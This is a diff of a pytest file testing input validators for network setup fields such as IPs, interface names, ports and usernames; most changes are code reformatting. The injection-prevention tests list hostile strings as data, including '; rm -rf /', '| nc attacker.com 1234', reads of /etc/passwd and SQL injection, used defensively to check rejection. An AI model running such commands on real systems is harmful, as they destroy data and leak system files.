@@ -6,14 +6,15 @@ identify valid and invalid inputs, preventing injection attacks and
 configuration errors.
 """
 
-import pytest
 import sys
 from pathlib import Path
+
+import pytest
 
 # Add project root to path
 sys.path.insert(0, str(Path(__file__).parent.parent))
 
-from setup import SetupConfig
+from install import SetupConfig
 
 
 class TestIPValidation:
@@ -60,11 +61,16 @@ class TestIPValidation:
             ("224.0.0.1", False),  # Multicast - rejected
             ("239.255.255.255", False),  # Multicast upper bound - rejected
             ("240.0.0.1", False),  # Reserved (future use) - rejected
-            ("192.168.001.001", False),  # Leading zeros - rejected by ipaddress.ip_address()
+            (
+                "192.168.001.001",
+                False,
+            ),  # Leading zeros - rejected by ipaddress.ip_address()
         ]
         for ip, expected in edge_cases:
             result = config.validate_ip(ip)
-            assert result == expected, f"IP {ip} validation failed (expected {expected}, got {result})"
+            assert (
+                result == expected
+            ), f"IP {ip} validation failed (expected {expected}, got {result})"
 
 
 class TestSubnetValidation:
@@ -84,7 +90,9 @@ class TestSubnetValidation:
             ("10.10.100.0", "24"),
         ]
         for ip, netmask in valid_subnets:
-            assert config.validate_subnet(ip, netmask), f"Valid subnet rejected: {ip}/{netmask}"
+            assert config.validate_subnet(
+                ip, netmask
+            ), f"Valid subnet rejected: {ip}/{netmask}"
 
     def test_invalid_subnets(self, config):
         """Test invalid IP/netmask combinations."""
@@ -96,7 +104,9 @@ class TestSubnetValidation:
             ("192.168.1.1", ""),  # Empty netmask
         ]
         for ip, netmask in invalid_subnets:
-            assert not config.validate_subnet(ip, netmask), f"Invalid subnet accepted: {ip}/{netmask}"
+            assert not config.validate_subnet(
+                ip, netmask
+            ), f"Invalid subnet accepted: {ip}/{netmask}"
 
 
 class TestInterfaceNameValidation:
@@ -124,7 +134,9 @@ class TestInterfaceNameValidation:
             "team0",
         ]
         for interface in valid_interfaces:
-            assert config.validate_interface_name(interface), f"Valid interface rejected: {interface}"
+            assert config.validate_interface_name(
+                interface
+            ), f"Valid interface rejected: {interface}"
 
     def test_invalid_interface_names(self, config):
         """Test invalid interface names (potential injection vectors)."""
@@ -145,13 +157,17 @@ class TestInterfaceNameValidation:
             "eth$0",  # Invalid character $
         ]
         for interface in invalid_interfaces:
-            assert not config.validate_interface_name(interface), f"Invalid interface accepted: {interface}"
+            assert not config.validate_interface_name(
+                interface
+            ), f"Invalid interface accepted: {interface}"
 
     def test_interface_name_length_limits(self, config):
         """Test interface name length boundaries."""
         assert config.validate_interface_name("a"), "Single char rejected"
         assert config.validate_interface_name("a" * 15), "15 char interface rejected"
-        assert not config.validate_interface_name("a" * 16), "16 char interface accepted"
+        assert not config.validate_interface_name(
+            "a" * 16
+        ), "16 char interface accepted"
 
 
 class TestPortValidation:
@@ -173,7 +189,9 @@ class TestPortValidation:
         ]
         for port in valid_ports:
             assert config.validate_port(port), f"Valid port rejected: {port}"
-            assert config.validate_port(str(port)), f"Valid port string rejected: {port}"
+            assert config.validate_port(
+                str(port)
+            ), f"Valid port string rejected: {port}"
 
     def test_invalid_ports(self, config):
         """Test invalid port numbers."""
@@ -218,7 +236,9 @@ class TestUsernameValidation:
             "a" * 32,  # Maximum length (32)
         ]
         for username in valid_usernames:
-            assert config.validate_username(username), f"Valid username rejected: {username}"
+            assert config.validate_username(
+                username
+            ), f"Valid username rejected: {username}"
 
     def test_invalid_usernames(self, config):
         """Test invalid usernames (potential injection vectors)."""
@@ -238,7 +258,9 @@ class TestUsernameValidation:
             "a" * 33,  # Too long (>32 chars)
         ]
         for username in invalid_usernames:
-            assert not config.validate_username(username), f"Invalid username accepted: {username}"
+            assert not config.validate_username(
+                username
+            ), f"Invalid username accepted: {username}"
 
     def test_username_length_limits(self, config):
         """Test username length boundaries."""
@@ -278,7 +300,9 @@ class TestSanitizeInput:
         ]
         for input_text in dangerous_inputs:
             sanitized = config.sanitize_input(input_text)
-            assert sanitized is None, f"Dangerous input was not rejected: {input_text} -> {sanitized}"
+            assert (
+                sanitized is None
+            ), f"Dangerous input was not rejected: {input_text} -> {sanitized}"
 
 
 class TestSecurityInjectionPrevention:
@@ -293,35 +317,44 @@ class TestSecurityInjectionPrevention:
     def config(self):
         return SetupConfig()
 
-    @pytest.mark.parametrize("malicious_input", [
-        "; rm -rf /",
-        "&& cat /etc/passwd",
-        "| nc attacker.com 1234",
-        "`whoami`",
-        "$(id)",
-        "../../../etc/passwd",
-        "'; DROP TABLE users; --",
-        "\n/bin/bash",
-        "\r\nmalicious",
-    ])
+    @pytest.mark.parametrize(
+        "malicious_input",
+        [
+            "; rm -rf /",
+            "&& cat /etc/passwd",
+            "| nc attacker.com 1234",
+            "`whoami`",
+            "$(id)",
+            "../../../etc/passwd",
+            "'; DROP TABLE users; --",
+            "\n/bin/bash",
+            "\r\nmalicious",
+        ],
+    )
     def test_interface_injection_prevention(self, config, malicious_input):
         """Test that malicious interface names are rejected."""
         # Try as standalone
-        assert not config.validate_interface_name(malicious_input), \
-            f"Malicious input accepted: {malicious_input}"
+        assert not config.validate_interface_name(
+            malicious_input
+        ), f"Malicious input accepted: {malicious_input}"
 
         # Try prepended to valid interface
-        assert not config.validate_interface_name(f"eth0{malicious_input}"), \
-            f"Malicious suffix accepted: eth0{malicious_input}"
+        assert not config.validate_interface_name(
+            f"eth0{malicious_input}"
+        ), f"Malicious suffix accepted: eth0{malicious_input}"
 
-    @pytest.mark.parametrize("malicious_input", [
-        "root; whoami",
-        "admin && ls",
-        "user|bash",
-        "user`id`",
-        "user$(cat /etc/passwd)",
-    ])
+    @pytest.mark.parametrize(
+        "malicious_input",
+        [
+            "root; whoami",
+            "admin && ls",
+            "user|bash",
+            "user`id`",
+            "user$(cat /etc/passwd)",
+        ],
+    )
     def test_username_injection_prevention(self, config, malicious_input):
         """Test that malicious usernames are rejected."""
-        assert not config.validate_username(malicious_input), \
-            f"Malicious username accepted: {malicious_input}"
+        assert not config.validate_username(
+            malicious_input
+        ), f"Malicious username accepted: {malicious_input}"
